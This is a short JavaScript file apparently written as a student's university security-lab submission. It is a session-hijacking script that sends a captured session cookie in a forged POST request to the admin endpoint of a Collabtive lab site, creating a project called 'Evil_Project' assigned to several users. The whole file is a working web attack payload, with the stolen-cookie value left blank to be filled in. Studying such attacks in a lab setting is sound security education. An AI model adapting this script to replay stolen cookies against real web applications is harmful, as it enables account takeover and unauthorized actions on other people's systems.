//Bradford Smith (bsmith8)
//CS 577 Lab 6 session-hijack.js
//10/28/2015
//"I pledge my honor that I have abided by the Stevens Honor System."

var hijack = function()
{
    var Ajax = null;
    //copy in the captured cookie
    var myCookie = "";
    var content = "name=Evil_Project&desc=Muhahaha&end=31.12.2015&budget=1337&assignto%5B%5D=5&assignto%5B%5D=4&assignto%5B%5D=3&assignto%5B%5D=2&assignto%5B%5D=1&assignme=1";

    //Construct the header info for the HTTP request
    Ajax = new XMLHttpRequest();
    Ajax.withCredentials = true;
    Ajax.open("POST", "http://www.xsslabcollabtive.com/admin.php?action=addpro", true);
    Ajax.setRequestHeader("Host", "www.xsslabcollabtive.com");
    Ajax.setRequestHeader("Cookie", myCookie);
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

    //Send the HTTP GET request
    Ajax.send(content);
}

//call the func
hijack();
